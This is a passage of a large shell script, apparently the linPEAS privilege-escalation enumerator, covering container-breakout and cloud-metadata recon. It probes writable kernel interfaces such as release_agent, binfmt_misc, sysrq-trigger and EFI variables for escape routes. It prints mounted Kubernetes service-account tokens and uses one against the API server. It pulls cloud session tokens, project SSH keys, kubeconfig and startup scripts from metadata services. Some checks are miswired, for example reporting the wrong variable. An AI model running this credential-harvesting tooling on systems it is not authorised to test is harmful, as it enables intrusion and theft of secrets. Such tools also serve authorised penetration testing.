  1772	  binfmt_misc_breakout="$( (echo -n '' > /proc/sys/fs/binfmt_misc/register && echo Yes) 2>/dev/null || echo No)"
  1773	  proc_configgz_readable="$([ -r '/proc/config.gz' ] 2>/dev/null && echo Yes || echo No)"
  1774	  sysreq_trigger_dos="$( (echo -n '' > /proc/sysrq-trigger && echo Yes) 2>/dev/null || echo No)"
  1775	  kmsg_readable="$( (dmesg > /dev/null 2>&1 && echo Yes) 2>/dev/null || echo No)"  # Kernel Exploit Dev
  1776	  kallsyms_readable="$( (head -n 1 /proc/kallsyms > /dev/null && echo Yes )2>/dev/null || echo No)" # Kernel Exploit Dev
  1777	  mem_readable="$( (head -n 1 /proc/self/mem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  1778	  if [ "$(head -n 1 /tmp/kcore 2>/dev/null)" ]; then kcore_readable="Yes"; else kcore_readable="No"; fi
  1779	  kmem_readable="$( (head -n 1 /proc/kmem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  1780	  kmem_writable="$( (echo -n '' > /proc/kmem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  1781	  mem_readable="$( (head -n 1 /proc/mem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  1782	  mem_writable="$( (echo -n '' > /proc/mem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  1783	  sched_debug_readable="$( (head -n 1 /proc/sched_debug > /dev/null && echo Yes) 2>/dev/null || echo No)"
  1784	  mountinfo_readable="$( (head -n 1 /proc/*/mountinfo > /dev/null && echo Yes) 2>/dev/null || echo No)"
  1785	  uevent_helper_breakout="$( (echo -n '' > /sys/kernel/uevent_helper && echo Yes) 2>/dev/null || echo No)"
  1786	  vmcoreinfo_readable="$( (head -n 1 /sys/kernel/vmcoreinfo > /dev/null && echo Yes) 2>/dev/null || echo No)"
  1787	  security_present="$( (ls -l /sys/kernel/security > /dev/null && echo Yes) 2>/dev/null || echo No)"
  1788	  security_writable="$( (echo -n '' > /sys/kernel/security/a && echo Yes) 2>/dev/null || echo No)"
  1789	  efi_vars_writable="$( (echo -n '' > /sys/firmware/efi/vars && echo Yes) 2>/dev/null || echo No)"
  1790	  efi_efivars_writable="$( (echo -n '' > /sys/firmware/efi/efivars && echo Yes) 2>/dev/null || echo No)"
  1791	}
  1792	
  1793	
  1794	##############################################
  1795	#---------------) Containers (---------------#
  1796	##############################################
  1797	containerCheck
  1798	
  1799	print_2title "Container related tools present (if any):"
  1800	command -v docker 
  1801	command -v lxc 
  1802	command -v rkt 
  1803	command -v kubectl
  1804	command -v podman
  1805	command -v runc
  1806	
  1807	if [ "$$FAT_LINPEAS_AMICONTAINED" ]; then
  1808	  print_2title "Am I Containered?"
  1809	  execBin "AmIContainered" "https://github.com/genuinetools/amicontained" "$FAT_LINPEAS_AMICONTAINED"
  1810	fi
  1811	
  1812	print_2title "Container details"
  1813	print_list "Is this a container? ...........$NC $containerType"
  1814	
  1815	print_list "Any running containers? ........ "$NC
  1816	# Get counts of running containers for each platform
  1817	dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
  1818	podmancontainers=$(podman ps --format "{{.Names}}" 2>/dev/null | wc -l)
  1819	lxccontainers=$(lxc list -c n --format csv 2>/dev/null | wc -l)
  1820	rktcontainers=$(rkt list 2>/dev/null | tail -n +2  | wc -l)
  1821	if [ "$dockercontainers" -eq "0" ] && [ "$lxccontainers" -eq "0" ] && [ "$rktcontainers" -eq "0" ] && [ "$podmancontainers" -eq "0" ]; then
  1822	    echo_no
  1823	else
  1824	    containerCounts=""
  1825	    if [ "$dockercontainers" -ne "0" ]; then containerCounts="${containerCounts}docker($dockercontainers) "; fi
  1826	    if [ "$podmancontainers" -ne "0" ]; then containerCounts="${containerCounts}podman($podmancontainers) "; fi
  1827	    if [ "$lxccontainers" -ne "0" ]; then containerCounts="${containerCounts}lxc($lxccontainers) "; fi
  1828	    if [ "$rktcontainers" -ne "0" ]; then containerCounts="${containerCounts}rkt($rktcontainers) "; fi
  1829	    echo "Yes $containerCounts" | sed -${E} "s,.*,${SED_RED},"
  1830	    
  1831	    # List any running containers
  1832	    if [ "$dockercontainers" -ne "0" ]; then echo "Running Docker Containers" | sed -${E} "s,.*,${SED_RED},"; docker ps | tail -n +2 2>/dev/null; echo ""; fi
  1833	    if [ "$podmancontainers" -ne "0" ]; then echo "Running Podman Containers" | sed -${E} "s,.*,${SED_RED},"; podman ps | tail -n +2 2>/dev/null; echo ""; fi
  1834	    if [ "$lxccontainers" -ne "0" ]; then echo "Running LXC Containers" | sed -${E} "s,.*,${SED_RED},"; lxc list 2>/dev/null; echo ""; fi
  1835	    if [ "$rktcontainers" -ne "0" ]; then echo "Running RKT Containers" | sed -${E} "s,.*,${SED_RED},"; rkt list 2>/dev/null; echo ""; fi
  1836	fi
  1837	
  1838	#If docker
  1839	if echo "$containerType" | grep -qi "docker"; then
  1840	    print_2title "Docker Container details"
  1841	    inDockerGroup
  1842	    print_list "Am I inside Docker group .......$NC $DOCKER_GROUP\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
  1843	    print_list "Looking and enumerating Docker Sockets (if any):\n"$NC
  1844	    enumerateDockerSockets
  1845	    print_list "Docker version .................$NC$dockerVersion"
  1846	    checkDockerVersionExploits
  1847	    print_list "Vulnerable to CVE-2019-5736 ....$NC$VULN_CVE_2019_5736"$NC | sed -${E} "s,Yes,${SED_RED_YELLOW},"
  1848	    print_list "Vulnerable to CVE-2019-13139 ...$NC$VULN_CVE_2019_13139"$NC | sed -${E} "s,Yes,${SED_RED_YELLOW},"
  1849	    if [ "$inContainer" ]; then
  1850	        checkDockerRootless
  1851	        print_list "Rootless Docker? ............... $DOCKER_ROOTLESS\n"$NC | sed -${E} "s,No,${SED_RED}," | sed -${E} "s,Yes,${SED_GREEN},"
  1852	        echo ""
  1853	    fi
  1854	    if df -h | grep docker; then
  1855	        print_2title "Docker Overlays"
  1856	        df -h | grep docker
  1857	    fi
  1858	fi
  1859	
  1860	#If token secrets mounted
  1861	if [ "$(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p')" ]; then
  1862	  print_2title "Listing mounted tokens"
  1863	  print_info "https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/attacking-kubernetes-from-inside-a-pod"
  1864	  ALREADY="IinItialVaaluE"
  1865	  for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
  1866	      TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
  1867	      if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
  1868	          ALREADY="$ALREADY|$TOKEN"
  1869	          echo "Directory: $i"
  1870	          echo "Namespace: $(cat $i)"
  1871	          echo ""
  1872	          echo $TOKEN
  1873	          echo "================================================================================"
  1874	          echo ""
  1875	      fi
  1876	  done
  1877	fi
  1878	
  1879	if [ "$inContainer" ]; then
  1880	    echo ""
  1881	    print_2title "Container & breakout enumeration"
  1882	    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout"
  1883	    print_list "Container ID ...................$NC $(cat /etc/hostname && echo -n '\n')"
  1884	    if [ -f "/proc/1/cpuset" ] && echo "$containerType" | grep -qi "docker"; then
  1885	        print_list "Container Full ID ..............$NC $(basename $(cat /proc/1/cpuset))\n"
  1886	    fi
  1887	    print_list "Seccomp enabled? ............... "$NC
  1888	    ([ "$(grep Seccomp /proc/self/status | grep -v 0)" ] && echo "enabled" || echo "disabled") | sed "s,disabled,${SED_RED}," | sed "s,enabled,${SED_GREEN},"
  1889	
  1890	    print_list "AppArmor profile? .............. "$NC
  1891	    (cat /proc/self/attr/current 2>/dev/null || echo "disabled") | sed "s,disabled,${SED_RED}," | sed "s,kernel,${SED_GREEN},"
  1892	
  1893	    print_list "User proc namespace? ........... "$NC
  1894	    if [ "$(cat /proc/self/uid_map 2>/dev/null)" ]; then (printf "enabled"; cat /proc/self/uid_map) | sed "s,enabled,${SED_GREEN},"; else echo "disabled" | sed "s,disabled,${SED_RED},"; fi
  1895	
  1896	    checkContainerExploits
  1897	    print_list "Vulnerable to CVE-2019-5021 .... $VULN_CVE_2019_5021\n"$NC | sed -${E} "s,Yes,${SED_RED_YELLOW},"
  1898	
  1899	    print_3title "Breakout via mounts"
  1900	    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts"
  1901	    
  1902	    checkProcSysBreakouts
  1903	    print_list "/proc mounted? ................. $proc_mounted\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
  1904	    print_list "/dev mounted? .................. $dev_mounted\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
  1905	    print_list "Run ushare ..................... $run_unshare\n" | sed -${E} "s,Yes,${SED_RED},"
  1906	    print_list "release_agent breakout 1........ $release_agent_breakout1\n" | sed -${E} "s,Yes,${SED_RED},"
  1907	    print_list "release_agent breakout 2........ $release_agent_breakout2\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
  1908	    print_list "core_pattern breakout .......... $core_pattern_breakout\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
  1909	    print_list "binfmt_misc breakout ........... $binfmt_misc_breakout\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
  1910	    print_list "uevent_helper breakout ......... $uevent_helper_breakout\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
  1911	    print_list "is modprobe present ............ $modprobe_present\n" | sed -${E} "s,/.*,${SED_RED},"
  1912	    print_list "DoS via panic_on_oom ........... $panic_on_oom_dos\n" | sed -${E} "s,Yes,${SED_RED},"
  1913	    print_list "DoS via panic_sys_fs ........... $panic_sys_fs_dos\n" | sed -${E} "s,Yes,${SED_RED},"
  1914	    print_list "DoS via sysreq_trigger_dos ..... $sysreq_trigger_dos\n" | sed -${E} "s,Yes,${SED_RED},"
  1915	    print_list "/proc/config.gz readable ....... $proc_configgz_readable\n" | sed -${E} "s,Yes,${SED_RED},"
  1916	    print_list "/proc/sched_debug readable ..... $sched_debug_readable\n" | sed -${E} "s,Yes,${SED_RED},"
  1917	    print_list "/proc/*/mountinfo readable ..... $mountinfo_readable\n" | sed -${E} "s,Yes,${SED_RED},"
  1918	    print_list "/sys/kernel/security present ... $security_present\n" | sed -${E} "s,Yes,${SED_RED},"
  1919	    print_list "/sys/kernel/security writable .. $security_writable\n" | sed -${E} "s,Yes,${SED_RED},"
  1920	    if [ "$EXTRA_CHECKS" ]; then
  1921	      print_list "/proc/kmsg readable ............ $kmsg_readable\n" | sed -${E} "s,Yes,${SED_RED},"
  1922	      print_list "/proc/kallsyms readable ........ $kallsyms_readable\n" | sed -${E} "s,Yes,${SED_RED},"
  1923	      print_list "/proc/self/mem readable ........ $sched_debug_readable\n" | sed -${E} "s,Yes,${SED_RED},"
  1924	      print_list "/proc/kcore readable ........... $kcore_readable\n" | sed -${E} "s,Yes,${SED_RED},"
  1925	      print_list "/proc/kmem readable ............ $kmem_readable\n" | sed -${E} "s,Yes,${SED_RED},"
  1926	      print_list "/proc/kmem writable ............ $kmem_writable\n" | sed -${E} "s,Yes,${SED_RED},"
  1927	      print_list "/proc/mem readable ............. $mem_readable\n" | sed -${E} "s,Yes,${SED_RED},"
  1928	      print_list "/proc/mem writable ............. $mem_writable\n" | sed -${E} "s,Yes,${SED_RED},"
  1929	      print_list "/sys/kernel/vmcoreinfo readable  $vmcoreinfo_readable\n" | sed -${E} "s,Yes,${SED_RED},"
  1930	      print_list "/sys/firmware/efi/vars writable  $efi_vars_writable\n" | sed -${E} "s,Yes,${SED_RED},"
  1931	      print_list "/sys/firmware/efi/efivars writable $efi_efivars_writable\n" | sed -${E} "s,Yes,${SED_RED},"
  1932	    fi
  1933	    
  1934	    echo ""
  1935	    print_3title "Namespaces"
  1936	    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/namespaces"
  1937	    ls -l /proc/self/ns/
  1938	
  1939	    if echo "$containerType" | grep -qi "kubernetes"; then
  1940	        print_list "Kubernetes namespace ...........$NC $(cat /run/secrets/kubernetes.io/serviceaccount/namespace /var/run/secrets/kubernetes.io/serviceaccount/namespace /secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)\n"
  1941	        print_list "Kubernetes token ...............$NC $(cat /run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/token /secrets/kubernetes.io/serviceaccount/token 2>/dev/null)\n"
  1942	        echo ""
  1943	        
  1944	        print_2title "Kubernetes Information"
  1945	        print_info "https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/attacking-kubernetes-from-inside-a-pod"
  1946	        
  1947	        
  1948	        print_3title "Kubernetes service account folder"
  1949	        ls -lR /run/secrets/kubernetes.io/ /var/run/secrets/kubernetes.io/ /secrets/kubernetes.io/ 2>/dev/null
  1950	        echo ""
  1951	        
  1952	        print_3title "Kubernetes env vars"
  1953	        (env | set) | grep -Ei "kubernetes|kube" | grep -Ev "^WF=|^Wfolders=|^mounted=|^USEFUL_SOFTWARE='|^INT_HIDDEN_FILES=|^containerType="
  1954	        echo ""
  1955	
  1956	        print_3title "Current sa user k8s permissions"
  1957	        print_info "https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/hardening-roles-clusterroles"
  1958	        kubectl auth can-i --list 2>/dev/null || curl -s -k -d "$(echo \"eyJraW5kIjoiU2VsZlN1YmplY3RSdWxlc1JldmlldyIsImFwaVZlcnNpb24iOiJhdXRob3JpemF0aW9uLms4cy5pby92MSIsIm1ldGFkYXRhIjp7ImNyZWF0aW9uVGltZXN0YW1wIjpudWxsfSwic3BlYyI6eyJuYW1lc3BhY2UiOiJlZXZlZSJ9LCJzdGF0dXMiOnsicmVzb3VyY2VSdWxlcyI6bnVsbCwibm9uUmVzb3VyY2VSdWxlcyI6bnVsbCwiaW5jb21wbGV0ZSI6ZmFsc2V9fQo=\"|base64 -d)" \
  1959	          "https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  1960	            -X 'POST' -H 'Content-Type: application/json' \
  1961	            --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" | sed "s,secrets|exec|create|patch|impersonate|\"*\",${SED_RED},"
  1962	
  1963	    fi
  1964	    echo ""
  1965	
  1966	    print_2title "Container Capabilities"
  1967	    print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape"
  1968	    if [ "$(command -v capsh)" ]; then 
  1969	      capsh --print 2>/dev/null | sed -${E} "s,$containercapsB,${SED_RED},g"
  1970	    else
  1971	      defautl_docker_caps="00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap"
  1972	      cat /proc/self/status | tr '\t' ' ' | grep Cap | sed -${E} "s, .*,${SED_RED},g" | sed -${E} "s/00000000a80425fb/$defautl_docker_caps/g" | sed -${E} "s,0000000000000000|00000000a80425fb,${SED_GREEN},g"
  1973	      echo $ITALIC"Run capsh --decode=<hex> to decode the capabilities"$NC
  1974	    fi
  1975	    echo ""
  1976	
  1977	    print_2title "Privilege Mode"
  1978	    if [ -x "$(command -v fdisk)" ]; then
  1979	        if [ "$(fdisk -l 2>/dev/null | wc -l)" -gt 0 ]; then
  1980	            echo "Privilege Mode is enabled"| sed -${E} "s,enabled,${SED_RED_YELLOW},"
  1981	        else
  1982	            echo "Privilege Mode is disabled"| sed -${E} "s,disabled,${SED_GREEN},"
  1983	        fi
  1984	    else
  1985	        echo_not_found
  1986	    fi
  1987	    echo ""
  1988	
  1989	    print_2title "Interesting Files Mounted"
  1990	    (mount -l || cat /proc/self/mountinfo || cat /proc/1/mountinfo || cat /proc/mounts || cat /proc/self/mounts || cat /proc/1/mounts )2>/dev/null | grep -Ev "$GREP_IGNORE_MOUNTS" | sed -${E} "s,.sock,${SED_RED}," | sed -${E} "s,docker.sock,${SED_RED_YELLOW}," | sed -${E} "s,/dev/,${SED_RED},g"
  1991	    echo ""
  1992	
  1993	    print_2title "Possible Entrypoints"
  1994	    ls -lah /*.sh /*entrypoint* /**/entrypoint* /**/*.sh /deploy* 2>/dev/null | sort | uniq
  1995	    echo ""
  1996	fi
  1997	
  1998	fi
  1999	echo ''
  2000	echo ''
  2001	if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
  2002	
  2003	if echo $CHECKS | grep -q cloud; then
  2004	print_title "Cloud"
  2005	###########################################
  2006	#-----------) Cloud functions (-----------#
  2007	###########################################
  2008	
  2009	GCP_GOOD_SCOPES="/devstorage.read_only|/logging.write|/monitoring|/servicecontrol|/service.management.readonly|/trace.append"
  2010	GCP_BAD_SCOPES="/cloud-platform|/compute"
  2011	
  2012	exec_with_jq(){
  2013	  if [ "$(command -v jq)" ]; then 
  2014	    $@ | jq 2>/dev/null;
  2015	    if ! [ $? -eq 0 ]; then
  2016	      $@;
  2017	    fi
  2018	   else 
  2019	    $@;
  2020	   fi
  2021	}
  2022	
  2023	check_gcp(){
  2024	  is_gcp="No"
  2025	  if grep -q metadata.google.internal /etc/hosts 2>/dev/null || (curl --connect-timeout 2 metadata.google.internal >/dev/null 2>&1 && [ "$?" -eq "0" ]) || (wget --timeout 2 --tries 1 metadata.google.internal >/dev/null 2>&1 && [ "$?" -eq "0" ]); then
  2026	    is_gcp="Yes"
  2027	  fi
  2028	}
  2029	
  2030	check_do(){
  2031	  is_do="No"
  2032	  if [ -f "/etc/cloud/cloud.cfg.d/90-digitalocean.cfg" ]; then
  2033	    is_do="Yes"
  2034	  fi
  2035	}
  2036	
  2037	check_ibm_vm(){
  2038	  is_ibm_vm="No"
  2039	  if grep -q "nameserver 161.26.0.10" "/etc/resolv.conf" && grep -q "nameserver 161.26.0.11" "/etc/resolv.conf"; then
  2040	    curl --connect-timeout 2  "http://169.254.169.254" > /dev/null 2>&1 || wget --timeout 2 --tries 1  "http://169.254.169.254" > /dev/null 2>&1
  2041	    if [ "$?" -eq 0 ]; then
  2042	      IBM_TOKEN=$( ( curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01" -H "Metadata-Flavor: ibm" -H "Accept: application/json" 2> /dev/null | cut -d '"' -f4 ) || ( wget --tries 1 -O - --method PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01" --header "Metadata-Flavor: ibm" --header "Accept: application/json" 2>/dev/null | cut -d '"' -f4 ) )
  2043	      is_ibm_vm="Yes"
  2044	    fi
  2045	  fi
  2046	}
  2047	
  2048	check_aws_ecs(){
  2049	  is_aws_ecs="No"
  2050	  if (env | grep -q ECS_CONTAINER_METADATA_URI_v4); then
  2051	    is_aws_ecs="Yes";
  2052	    aws_ecs_metadata_uri=$ECS_CONTAINER_METADATA_URI_v4;
  2053	    aws_ecs_service_account_uri="http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
  2054	  
  2055	  elif (env | grep -q ECS_CONTAINER_METADATA_URI); then
  2056	    is_aws_ecs="Yes";
  2057	    aws_ecs_metadata_uri=$ECS_CONTAINER_METADATA_URI;
  2058	    aws_ecs_service_account_uri="http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
  2059	  
  2060	  elif (env | grep -q AWS_CONTAINER_CREDENTIALS_RELATIVE_URI); then
  2061	    is_aws_ecs="Yes";
  2062	  fi
  2063	  
  2064	  if [ "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then
  2065	    aws_ecs_service_account_uri="http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
  2066	  fi
  2067	}
  2068	
  2069	check_aws_ec2(){
  2070	  is_aws_ec2="No"
  2071	  is_aws_ec2_beanstalk="No"
  2072	
  2073	  if [ -d "/var/log/amazon/" ]; then
  2074	    is_aws_ec2="Yes"
  2075	    EC2_TOKEN=$(curl --connect-timeout 2 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget --timeout 2 --tries 1 -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
  2076	
  2077	  else
  2078	    EC2_TOKEN=$(curl --connect-timeout 2 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget --timeout 2 --tries 1 -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
  2079	    if [ "$(echo $EC2_TOKEN | cut -c1-2)" = "AQ" ]; then
  2080	      is_aws_ec2="Yes"
  2081	    fi
  2082	  fi
  2083	  
  2084	  if [ "$is_aws_ec2" = "Yes" ] && grep -iq "Beanstalk" "/etc/motd"; then
  2085	    is_aws_ec2_beanstalk="Yes"
  2086	  fi
  2087	}
  2088	
  2089	check_aws_lambda(){
  2090	  is_aws_lambda="No"
  2091	
  2092	  if (env | grep -q AWS_LAMBDA_); then
  2093	    is_aws_lambda="Yes"
  2094	  fi
  2095	}
  2096	
  2097	check_aws_codebuild(){
  2098	  is_aws_codebuild="No"
  2099	
  2100	  if [ -f "/codebuild/output/tmp/env.sh" ] && grep -q "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" "/codebuild/output/tmp/env.sh" ; then
  2101	    is_aws_codebuild="Yes"
  2102	  fi
  2103	}
  2104	
  2105	check_az_vm(){
  2106	  is_az_vm="No"
  2107	
  2108	  if [ -d "/var/log/azure/" ]; then
  2109	    is_az_vm="Yes"
  2110	  
  2111	  elif cat /etc/resolv.conf 2>/dev/null | grep -q "search reddog.microsoft.com"; then
  2112	    is_az_vm="Yes"
  2113	  fi
  2114	}
  2115	
  2116	check_az_app(){
  2117	  is_az_app="No"
  2118	
  2119	  if [ -d "/opt/microsoft" ] && env | grep -q "IDENTITY_ENDPOINT"; then
  2120	    is_az_app="Yes"
  2121	  fi
  2122	}
  2123	
  2124	
  2125	check_gcp
  2126	print_list "Google Cloud Platform? ............... $is_gcp\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
  2127	check_aws_ecs
  2128	print_list "AWS ECS? ............................. $is_aws_ecs\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
  2129	check_aws_ec2
  2130	print_list "AWS EC2? ............................. $is_aws_ec2\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
  2131	print_list "AWS EC2 Beanstalk? ................... $is_aws_ec2_beanstalk\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
  2132	check_aws_lambda
  2133	print_list "AWS Lambda? .......................... $is_aws_lambda\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
  2134	check_aws_codebuild
  2135	print_list "AWS Codebuild? ....................... $is_aws_codebuild\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
  2136	check_do
  2137	print_list "DO Droplet? .......................... $is_do\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
  2138	check_ibm_vm
  2139	print_list "IBM Cloud VM? ........................ $is_ibm_vm\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
  2140	check_az_vm
  2141	print_list "Azure VM? ............................ $is_az_vm\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
  2142	check_az_app
  2143	print_list "Azure APP? ........................... $is_az_app\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
  2144	
  2145	echo ""
  2146	
  2147	if [ "$is_gcp" = "Yes" ]; then
  2148	    gcp_req=""
  2149	    if [ "$(command -v curl)" ]; then
  2150	        gcp_req='curl -s -f  -H "X-Google-Metadata-Request: True"'
  2151	    elif [ "$(command -v wget)" ]; then
  2152	        gcp_req='wget -q -O - --header "X-Google-Metadata-Request: True"'
  2153	    else 
  2154	        echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
  2155	    fi
  2156	
  2157	
  2158	    if [ "$gcp_req" ]; then
  2159	        print_2title "Google CLoud Platform Enumeration"
  2160	        print_info "https://book.hacktricks.xyz/cloud-security/gcp-security"
  2161	
  2162	        ## GC Project Info
  2163	        p_id=$(eval $gcp_req 'http://metadata.google.internal/computeMetadata/v1/project/project-id')
  2164	        [ "$p_id" ] && echo "Project-ID: $p_id"
  2165	        p_num=$(eval $gcp_req 'http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id')
  2166	        [ "$p_num" ] && echo "Project Number: $p_num"
  2167	        pssh_k=$(eval $gcp_req 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys')
  2168	        [ "$pssh_k" ] && echo "Project SSH-Keys: $pssh_k"
  2169	        p_attrs=$(eval $gcp_req 'http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true')
  2170	        [ "$p_attrs" ] && echo "All Project Attributes: $p_attrs"
  2171	
  2172	        # OSLogin Info
  2173	        osl_u=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/oslogin/users)
  2174	        [ "$osl_u" ] && echo "OSLogin users: $osl_u"
  2175	        osl_g=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/oslogin/groups)
  2176	        [ "$osl_g" ] && echo "OSLogin Groups: $osl_g"
  2177	        osl_sk=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/oslogin/security-keys)
  2178	        [ "$osl_sk" ] && echo "OSLogin Security Keys: $osl_sk"
  2179	        osl_au=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/oslogin/authorize)
  2180	        [ "$osl_au" ] && echo "OSLogin Authorize: $osl_au"
  2181	
  2182	        # Instance Info
  2183	        inst_d=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/description)
  2184	        [ "$inst_d" ] && echo "Instance Description: "
  2185	        inst_hostn=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/hostname)
  2186	        [ "$inst_hostn" ] && echo "Hostname: $inst_hostn"
  2187	        inst_id=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/id)
  2188	        [ "$inst_id" ] && echo "Instance ID: $inst_id"
  2189	        inst_img=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/image)
  2190	        [ "$inst_img" ] && echo "Instance Image: $inst_img"
  2191	        inst_mt=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/machine-type)
  2192	        [ "$inst_mt" ] && echo "Machine Type: $inst_mt"
  2193	        inst_n=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/name)
  2194	        [ "$inst_n" ] && echo "Instance Name: $inst_n"
  2195	        inst_tag=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/scheduling/tags)
  2196	        [ "$inst_tag" ] && echo "Instance tags: $inst_tag"
  2197	        inst_zone=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/zone)
  2198	        [ "$inst_zone" ] && echo "Zone: $inst_zone"
  2199	
  2200	        inst_k8s_loc=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-location")
  2201	        [ "$inst_k8s_loc" ] && echo "K8s Cluster Location: $inst_k8s_loc"
  2202	        inst_k8s_name=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-name")
  2203	        [ "$inst_k8s_name" ] && echo "K8s Cluster name: $inst_k8s_name"
  2204	        inst_k8s_osl_e=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/enable-oslogin")
  2205	        [ "$inst_k8s_osl_e" ] && echo "K8s OSLoging enabled: $inst_k8s_osl_e"
  2206	        inst_k8s_klab=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-labels")
  2207	        [ "$inst_k8s_klab" ] && echo "K8s Kube-labels: $inst_k8s_klab"
  2208	        inst_k8s_kubec=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kubeconfig")
  2209	        [ "$inst_k8s_kubec" ] && echo "K8s Kubeconfig: $inst_k8s_kubec"
  2210	        inst_k8s_kubenv=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env")
  2211	        [ "$inst_k8s_kubenv" ] && echo "K8s Kube-env: $inst_k8s_kubenv"
  2212	
  2213	        echo ""
  2214	        print_3title "Interfaces"
  2215	        for iface in $(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/"); do 
  2216	            echo "  IP: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/ip")
  2217	            echo "  Subnetmask: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
  2218	            echo "  Gateway: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
  2219	            echo "  DNS: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
  2220	            echo "  Network: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/network")
  2221	            echo "  ==============  "
  2222	        done
  2223	        
  2224	        echo ""
  2225	        print_3title "User Data"
  2226	        echo $(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script")
  2227	        echo ""
